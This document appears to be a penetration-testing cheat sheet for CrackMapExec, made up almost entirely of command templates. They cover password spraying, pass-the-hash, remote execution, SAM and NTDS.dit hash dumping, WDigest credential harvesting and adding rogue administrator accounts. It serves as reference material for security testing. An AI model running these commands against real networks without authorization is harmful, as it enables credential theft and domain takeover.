---
legal-banner: true
---

### **CRACKMAPEXEC (CME)**

CrackMapExec (CME) is an open-source post-exploitation tool that helps penetration testers to perform various network-level attacks and enumeration tasks. It is particularly useful for managing large Active Directory (AD) networks.

### **KEY FUNCTIONALITIES**

1. Enumerating Users and Groups
	`Lists users, groups, and other AD objects`
2. Password Spraying
	`Tests a single password against multiple user accounts`
3. Command Execution
	`Executes commands remotely on target systems`
4. Dumping Hashes
	`Extracts password hashes from remote systems`
5. Accessing Shares	
	`Lists and accesses SMB shares on remote systems`

### **TARGET FORMATS**

1. Single IP Address:
   	`crackmapexec smb [IP-ADDRESS-1] [IP-ADDRESS-2]`

2. IP range
   `crackmapexec smb [IP-ADDRESS]-28 [IP-ADDRESS]-67`

3. CIDR notation
   `crackmapexec smb [IP-ADDRESS]/24`

4. Targets from file
   `crackmapexec smb targets.txt`

### **CONNECT TO TARGET USING LOCAL ACCOUNT**

1. Connect with local account
   `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth`

2. Using Null Session:
   `crackmapexec smb [IP-ADDRESS] -u "" -p ""`

### **PASS THE HASH AGAINST A SUBNET**

1. Pass the hash with local auth
   `crackmapexec smb [IP_ADDRESS]/24 -u [USERNAME] -H '[LMHASH:NTHASH]' --local-auth`

2. Standard Pass the Hash
   `crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -H '[NTHASH]'`

### **BRUTEFORCING AND PASSWORD SPRAYING**

1. Single password
   `crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME]" -p "[PASSWORD]"`

2. Multiple passwords
   `crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME]" -p "[PASSWORD1]" "[PASSWORD2]"`

3. Multiple users
    `crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME1]" "[USERNAME2]" -p "[PASSWORD]"`

4. Users and passwords from files
    `crackmapexec smb [IP-ADDRESS]/24 -u [USER_FILE] -p [PASS_FILE]`

5. Users from file, hashes from file
    `crackmapexec smb [IP-ADDRESS]/24 -u [USER_FILE] -H [NTLM_HASH_FILE]`

### **USERS ENUMERATION**

1. Enumerate users
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --users`

2. Perform RID bruteforce to get users
   `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --rid-brute`

3. Enumerate domain groups
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --groups`

4. Enumerate local users
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-users`

### **HOSTS ENUMERATION**

1. Generate a list of relayable hosts
    `crackmapexec smb [IP-ADDRESS]/24 --gen-relay-list output.txt`

2. Enumerate available shares
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --shares`

3. Get the active sessions
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --sessions`

4. Check logged in users
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --lusers`

5. Get the password policy
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --pass-pol`

### **COMMAND EXECUTION METHODS**

1. Execute command through cmd.exe
    `crackmapexec smb [IP_ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'whoami'`

2. Force the smbexec method
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'net user Administrator /domain' --exec-method smbexec`

3. Execute commands through PowerShell
    `crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' -X 'whoami'`

### **GETTING CREDENTIALS**

1. Dump local SAM hashes
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --sam`

2. Enable WDigest to get credentials from LSA memory
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --wdigest enable`

3. Disable WDigest
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --wdigest disable`

4. Query user sessions
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'quser'`

5. Force logoff
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'logoff [SESSIONID]'`

6. Dump the NTDS.dit from DC using secretsdump.py
    `crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' --ntds`

7. Use Volume Shadow copy Service to dump NTDS.dit
    `crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' --ntds vss`

8. Dump the NTDS.dit password history
    `crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -p '[PASSWORD]' --ntds-history`

### **ADDITIONAL FEATURES**

1. Upload a file to a remote share
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --upload local_file.txt \\remote\share`

2. Download a file from a remote share
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --download \\remote\share\remote_file.txt local_path`

3. Add a new user
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -x "net user [NEW_USER] [new_pass] /add"`

4. Add a user to Admins group
    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -x "net localgroup administrators [NEW_USER] /add"`